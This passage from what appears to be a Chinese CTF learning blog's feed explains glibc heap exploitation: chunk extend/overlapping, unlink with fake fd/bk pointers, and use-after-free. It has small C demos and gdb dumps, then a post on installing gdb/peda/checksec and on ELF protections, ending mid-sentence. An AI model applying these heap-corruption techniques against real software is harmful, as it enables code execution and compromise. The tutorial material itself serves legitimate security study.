class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x00000000000000b0</span>  <span class="number">0x0000000000000020</span> &lt;=== 注意此处标记为空</span><br><span class="line"><span class="number">0x6020c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f31</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: <span class="attribute">fw</span>=0x602000, <span class="attribute">bk</span>=0x602000</span><br><span class="line"> →   Chunk(<span class="attribute">addr</span>=0x602010, <span class="attribute">size</span>=0xb0, <span class="attribute">flags</span>=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">    <span class="number">0x4005b0</span> &lt;main+<span class="number">74</span>&gt;        <span class="keyword">call</span>   <span class="number">0x400450</span> &lt;malloc@plt&gt;</span><br><span class="line">→   <span class="number">0x4005b5</span> &lt;main+<span class="number">79</span>&gt;        <span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>-<span class="number">0x8</span>], <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">rax</span> : <span class="number">0x0000000000602010</span></span><br></pre></td></tr></table></figure><h4 id="类型3-对-free-的-smallbin-进行-extend"><a href="#类型3-对-free-的-smallbin-进行-extend" class="headerlink" title="类型3-对 free 的 smallbin 进行 extend"></a>类型3-对 free 的 smallbin 进行 extend</h4><p>这个类型的利用是在第二种类型的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 chunk1 的 size 域。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//分配第一个0x80的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);<span class="comment">//首先进行释放，使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次 malloc 之后的结果如下：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== chunk <span class="number">1</span></span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure><p>我们首先释放 chunk1 使它进入 unsorted bin 中：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">     unsorted_bins[<span class="number">0</span>]: fw=<span class="number">0x602000</span>, bk=<span class="number">0x602000</span></span><br><span class="line"> →   Chunk(addr=<span class="number">0x602010</span>, size=<span class="number">0x90</span>, flags=PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span> &lt;=== 进入unsorted bin</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span> &lt;=== fd，bk</span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span> &lt;=== chunk <span class="number">2</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span> &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>然后篡改 chunk1 的 size 域：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x00000000000000b1</span> &lt;=== size域被篡改</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x00007ffff7dd1b78</span>  <span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602090</span>:   <span class="number">0x0000000000000090</span>  <span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x6020a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6020b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020f51</span></span><br></pre></td></tr></table></figure><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p><h4 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend/Shrink 可以做什么?"></a>Chunk Extend/Shrink 可以做什么?</h4><p>一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h4 id="类型4-通过-extend-后向-overlapping"><a href="#类型4-通过-extend-后向-overlapping" class="headerlink" title="类型4-通过 extend 后向 overlapping"></a>类型4-通过 extend 后向 overlapping</h4><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x10 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的chunk4    </span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p><h4 id="类型5-通过-extend-前向-overlapping"><a href="#类型5-通过-extend-前向-overlapping" class="headerlink" title="类型5-通过 extend 前向 overlapping"></a>类型5-通过 extend 前向 overlapping</h4><p>这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin1</span></span><br><span class="line">    ptr2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin1</span></span><br><span class="line">    ptr3=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//fastbin2</span></span><br><span class="line">    ptr4=<span class="built_in">malloc</span>(<span class="number">128</span>);<span class="comment">//smallbin2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止与top合并</span></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x8</span>)=<span class="number">0x90</span>;<span class="comment">//修改pre_inuse域</span></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr4<span class="number">-0x10</span>)=<span class="number">0xd0</span>;<span class="comment">//修改pre_size域</span></span><br><span class="line">    <span class="built_in">free</span>(ptr4);<span class="comment">//unlink进行前向extend</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x150</span>);<span class="comment">//占位块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前向 extend 利用了 smallbin 的 unlink 机制，通过修改 pre_size 域可以跨越多个 chunk 进行合并实现 overlapping。</p><h3 id="Unlink-没搞特别懂"><a href="#Unlink-没搞特别懂" class="headerlink" title="Unlink(没搞特别懂)"></a>Unlink(没搞特别懂)</h3><h4 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>我们在利用 unlink 所造成的漏洞时，其实就是对 chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。</p><p><code>unlink</code>操作就是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）。其基本的过程如下：</p><p><img src="http://ggb0n.cool/images/heap1.png" alt=""></p><h4 id="古老的unlink"><a href="#古老的unlink" class="headerlink" title="古老的unlink"></a>古老的unlink</h4><p>在最初 unlink 实现的时候，其实是没有对 chunk 的 size 检查和双向链表检查的，即没有如下检查代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br><span class="line"><span class="comment">// 检查 fd 和 bk 指针(双向链表完整性检查)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// largebin 中 next_size 双向链表完整性检查 </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><p><strong>这里我们以 32 位为例</strong>，假设堆内存最初的布局是下面的样子：</p><p><img src="http://ggb0n.cool/images/heap2.png" alt=""></p><p>现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（<strong>比如溢出</strong>）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时：</p><ul><li>1、glibc 判断这个块是 small chunk</li><li>2、判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</li><li>3、判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</li><li>4、继而对 Nextchunk 采取 unlink 操作</li></ul><p>那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下：</p><ul><li>1、FD=P-&gt;fd = target addr -12</li><li>2、BK=P-&gt;bk = expect value</li><li>3、FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</li><li>4、BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</li></ul><p>我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要<strong>确保 expect value +8 地址具有可写的权限。</strong></p><p>比如说我们将<code>target addr</code>设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。<strong>需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。</strong></p><h4 id="当前的unlink"><a href="#当前的unlink" class="headerlink" title="当前的unlink"></a>当前的unlink</h4><p>刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br></pre></td></tr></table></figure><p>此时：</p><ul><li>FD-&gt;bk = target addr - 12 + 12=target_addr</li><li>BK-&gt;fd = expect value + 8</li></ul><p>那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是我们可以通过伪造的方式绕过这个机制。</p><p>首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要：</p><ul><li><code>fakeFD -&gt; bk == P</code> &lt;=&gt; <code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code> &lt;=&gt; <code>*(fakeBK + 8) == P</code></li></ul><p>当满足上述两式时，可以进入 Unlink 的环节，进行如下操作：</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 8) = fakeFD</code></li></ul><p>如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么：</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。</p><p>如果我们想要使得两者都指向 P，只需要按照如下方式修改即可：</p><p><img src="http://ggb0n.cool/images/heap3.png" alt=""></p><p>需要注意的是，这里我们并没有违背下面的约束，因为 P 在 Unlink 前是指向正确的 chunk 的指针。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">  malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);               \</span><br></pre></td></tr></table></figure><p>此外，其实如果我们设置 next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。</p><h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ul><li><p>1、条件</p><ul><li>UAF ，可修改 free 状态下 small bin 或是 unsorted bin 的 fd 和 bk 指针</li><li>已知位置存在一个指针指向可进行 UAF 的 chunk</li></ul></li><li><p>2、效果<br>使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18</p></li><li><p>3、思路<br>设指向可 UAF chunk 的指针的地址为 ptr：</p><ul><li>修改 fd 为 ptr - 0x18</li><li>修改 bk 为 ptr - 0x10</li><li>触发 unlink</li></ul><p>ptr 处的指针会变为 ptr - 0x18。</p></li></ul><h3 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h3><h4 id="漏洞原理-3"><a href="#漏洞原理-3" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p><ul><li>1、内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃；</li><li>2、内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>；</li><li>3、内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的<code>Use After Free</code>漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为<code>dangling pointer</code>。</p><p>一个简单的示例代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">"call print my name\n"</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">"I can also use it"</span>;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">"I can also use it"</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">"this is my function"</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"this pogram will crash...\n"</span>);</span><br><span class="line">  a-&gt;func(<span class="string">"can not be printed..."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line">➜  use_after_free git:(use_after_free) ✗ ./use_after_free                     </span><br><span class="line">this is my <span class="function"><span class="keyword">function</span></span></span><br><span class="line">I can also <span class="keyword">use</span> it</span><br><span class="line"><span class="keyword">call</span> <span class="built_in">print</span> my <span class="keyword">name</span></span><br><span class="line">this pogram will crash...</span><br><span class="line">[<span class="number">1</span>]    <span class="number">38738</span> segmentation fault (core dumped)  ./use_after_free</span><br></pre></td></tr></table></figure><p>可见被free掉的chunk又被成功访问了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="二进制" scheme="http://ggb0n.cool/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
      <category term="堆溢出" scheme="http://ggb0n.cool/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>入坑二进制</title>
    <link href="http://ggb0n.cool/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    <id>http://ggb0n.cool/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/</id>
    <published>2020-05-13T02:30:44.000Z</published>
    <updated>2020-05-18T17:46:38.971Z</updated>
    
    <content type="html"><![CDATA[<p>作为一名WEB菜狗，今天决定入坑二进制了，出于极大的好奇心和求知欲（其实就是自己太菜了，急需拓展知识啊~），加上也有些计算机原理的一些基础，想着不能把学的东西给废掉、扔掉，所以决定入坑！<a id="more"></a></p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="1、安装gdb和插件pada"><a href="#1、安装gdb和插件pada" class="headerlink" title="1、安装gdb和插件pada"></a>1、安装gdb和插件pada</h4><p>从基础做起，安装<code>gdb</code>以及其插件<code>pada</code></p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install gdb</span><br></pre></td></tr></table></figure><p>这里可能还需要安装一些库，依据需要安装即可，之后安装插件<code>pada</code>，二进制必备插件</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/longld/peda.git ~/peda</span><br></pre></td></tr></table></figure><p>git把库拉下来之后，把<code>source ~/peda/peda.py</code> 写入<code>~/.gdbinit</code></p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~<span class="string">/.gdbinit</span></span><br></pre></td></tr></table></figure><blockquote><p>装<code>pada</code>的时候也有用pip装的，但是可能导致gdb版本与python版本不匹配的问题，如果gdb自动绑定python3的话，直接pip下来的pada用着会报错。</p></blockquote><p>安装完毕，测试：</p><p><img src="http://ggb0n.cool/images/pada.png" alt=""></p><h4 id="2、安装checksec"><a href="#2、安装checksec" class="headerlink" title="2、安装checksec"></a>2、安装checksec</h4><p><code>checksec</code>可以查看目标文件开启了哪些保护机制，是玩二进制不可缺少的工具。上一步装的pada插件里其实是包含<code>checksec</code>的，但是版本比较久。可以自己安装，这样可以有效控制高版本</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">git clone http<span class="variable">s:</span>//github.<span class="keyword">com</span>/slimm609/checksec.<span class="keyword">sh</span>.git</span><br><span class="line"><span class="keyword">cd</span> checksec.<span class="keyword">sh</span></span><br><span class="line">sudo <span class="keyword">ln</span> –<span class="keyword">sf</span> checksec /usr/bin/checksec</span><br></pre></td></tr></table></figure><p>如果装的有旧版的<code>checksec</code>，此时创建软链接可能会失败，而且就算创建成功，启动<code>checksec</code>检查可能还是旧版，因为并没有进行所有的替换：</p><p><img src="http://ggb0n.cool/images/check2.png" alt=""></p><blockquote><p> 这里的<code>Arch</code>是程序架构信息，可以得知程序是64位还是32位的，有助于为编写exp提供信息。其他的内容就是保护机制开启的情况了，后面深入学习。</p></blockquote><p>有效办法是先找一下旧版的文件都存在哪些文件夹下面，用<code>find / -name checksec</code>命令查找：</p><p><img src="http://ggb0n.cool/images/check3.png" alt=""></p><p>然后全部替换，再次测试：</p><p><img src="http://ggb0n.cool/images/check1.png" alt=""></p><p>可以看到新版会进行更多的保护机制的测试。</p><p>由于<code>pada</code>内置有旧版的<code>checksec</code>（跟前面替换的旧版不是同一个），在用gdb调试之前进行检测的话，仍然是旧版：</p><p><img src="http://ggb0n.cool/images/check4.png" alt=""></p><p>两个版本共存，也挺好~</p><h3 id="浅学ELF保护机制"><a href="#浅学ELF保护机制" class="headerlink" title="浅学ELF保护机制"></a>浅学ELF保护机制</h3><p>上一节提到了检查文件的保护机制，这一节就记录一下Linux文件的保护机制相关知识，以后的学习免不了都会遇到。</p><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p><code>Relocation Read Only</code>， 重定位表只读。重定位表即<code>.got</code>和<code>.plt</code>两个表。此项技术主要针对 GOT 改写的攻击方式，分为两种：<code>Partial RELRO</code>和<code>Full RELRO</code>。<br><code>Partical RELRO</code>易受到攻击，例如攻击者可以<code>atoi.got</code>为<code>system.plt</code>，进而输入<code>/bin/sh\x00</code>获得<code>shell</code>。<code>Full RELRO</code>使整个<code>GOT</code>只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p><h4 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h4><p><code>Canary</code>是金丝雀的意思，技术上表示最先的测试的意思。这个来自以前挖煤的时候，矿工都会先把金丝雀放进矿洞，或者挖煤的时候一直带着金丝雀。金丝雀对甲烷和一氧化碳浓度比较敏感，会先报警。所以大家都用<code>canary</code>来搞最先的测试。<code>stack canary</code>表示栈的报警保护。</p><p>在函数返回值之前添加的一串随机数（不超过机器字长），末位为<code>/x00</code>（提供了覆盖最后一字节输出泄露<code>canary</code>的可能），如果出现缓冲区溢出攻击，覆盖内容覆盖到<code>canary</code>处，就会改变原本该处的数值，当程序执行到此处时，会检查<code>canary</code>值是否跟开始的值一样，如果不一样，程序会崩溃，从而达到保护返回地址的目的。</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p><code>Non-Executable Memory</code>，不可执行内存。<code>NX（DEP）</code>的基本原理是将数据所在内存页标识为<code>不可执行</code>，当程序溢出成功转入<code>shellcode</code>时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。栈溢出的核心就是通过局部变量覆盖返回地址，然后加入shellcode，<code>NX</code>策略是使栈区域的代码无法执行。</p><p>绕过这类保护最常见的方法为<code>ROP(Return-Oriented 